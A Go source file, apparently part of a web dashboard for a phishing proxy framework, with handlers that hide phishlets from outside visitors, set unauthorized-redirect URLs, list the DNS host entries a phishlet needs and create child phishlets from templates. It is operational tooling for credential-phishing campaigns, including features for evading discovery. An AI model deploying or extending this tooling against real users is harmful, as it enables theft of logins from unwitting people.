package dashboard

import (
	"net/http"
	"net/url"
	"strings"

	"github.com/gorilla/mux"
)

// handleHidePhishlet / handleUnhidePhishlet toggle a phishlet's visibility
// (hidden phishlets redirect external requests away).
func (s *Server) handleHidePhishlet(w http.ResponseWriter, r *http.Request) {
	s.setPhishletHidden(w, r, true)
}

func (s *Server) handleUnhidePhishlet(w http.ResponseWriter, r *http.Request) {
	s.setPhishletHidden(w, r, false)
}

func (s *Server) setPhishletHidden(w http.ResponseWriter, r *http.Request, hide bool) {
	u := userFromContext(r.Context())
	name := mux.Vars(r)["name"]
	if err := s.cfg.SetSiteHidden(name, hide); err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	action := "unhide_phishlet"
	if hide {
		action = "hide_phishlet"
	}
	s.store.Audit(u.Username, action, name, "", clientIP(r))
	writeJSON(w, http.StatusOK, map[string]interface{}{"phishlets": s.cfg.ExportPhishlets()})
}

type unauthUrlRequest struct {
	UnauthUrl string `json:"unauth_url"`
}

// handleSetPhishletUnauthUrl sets a per-phishlet unauthorized-redirect URL.
func (s *Server) handleSetPhishletUnauthUrl(w http.ResponseWriter, r *http.Request) {
	u := userFromContext(r.Context())
	name := mux.Vars(r)["name"]
	var req unauthUrlRequest
	if err := decodeJSON(r, &req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid request body")
		return
	}
	ru := strings.TrimSpace(req.UnauthUrl)
	if ru != "" {
		if _, err := url.ParseRequestURI(ru); err != nil {
			writeError(w, http.StatusBadRequest, "invalid URL")
			return
		}
	}
	if _, err := s.cfg.GetPhishlet(name); err != nil {
		writeError(w, http.StatusNotFound, "phishlet not found")
		return
	}
	s.cfg.SetSiteUnauthUrl(name, ru)
	s.store.Audit(u.Username, "set_phishlet_unauth_url", name, ru, clientIP(r))
	writeJSON(w, http.StatusOK, map[string]interface{}{"phishlets": s.cfg.ExportPhishlets()})
}

// handleGetPhishletHosts returns the DNS/hosts entries for a phishlet (terminal:
// `phishlets get-hosts`).
func (s *Server) handleGetPhishletHosts(w http.ResponseWriter, r *http.Request) {
	name := mux.Vars(r)["name"]
	ip, hosts, err := s.cfg.PhishletHosts(name)
	if err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	lines := make([]string, 0, len(hosts))
	for _, h := range hosts {
		lines = append(lines, ip+" "+h)
	}
	writeJSON(w, http.StatusOK, map[string]interface{}{
		"external_ip": ip,
		"hosts":       hosts,
		"lines":       lines,
	})
}

type createChildRequest struct {
	Name   string            `json:"name"`
	Parent string            `json:"parent"`
	Params map[string]string `json:"params"`
}

// handleCreateChildPhishlet creates a child phishlet from a template parent with
// predefined custom parameters (terminal: `phishlets create`).
func (s *Server) handleCreateChildPhishlet(w http.ResponseWriter, r *http.Request) {
	u := userFromContext(r.Context())
	var req createChildRequest
	if err := decodeJSON(r, &req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid request body")
		return
	}
	if !validPhishletName(req.Name) {
		writeError(w, http.StatusBadRequest, "invalid name: use letters, digits, '-' or '_' (max 64)")
		return
	}
	if req.Parent == "" {
		writeError(w, http.StatusBadRequest, "parent phishlet is required")
		return
	}
	if req.Params == nil {
		req.Params = map[string]string{}
	}
	if err := s.cfg.AddSubPhishlet(req.Name, req.Parent, req.Params); err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
	s.cfg.SaveSubPhishlets()
	s.store.Audit(u.Username, "create_child_phishlet", req.Name, req.Parent, clientIP(r))
	writeJSON(w, http.StatusCreated, map[string]interface{}{"phishlets": s.cfg.ExportPhishlets()})
}
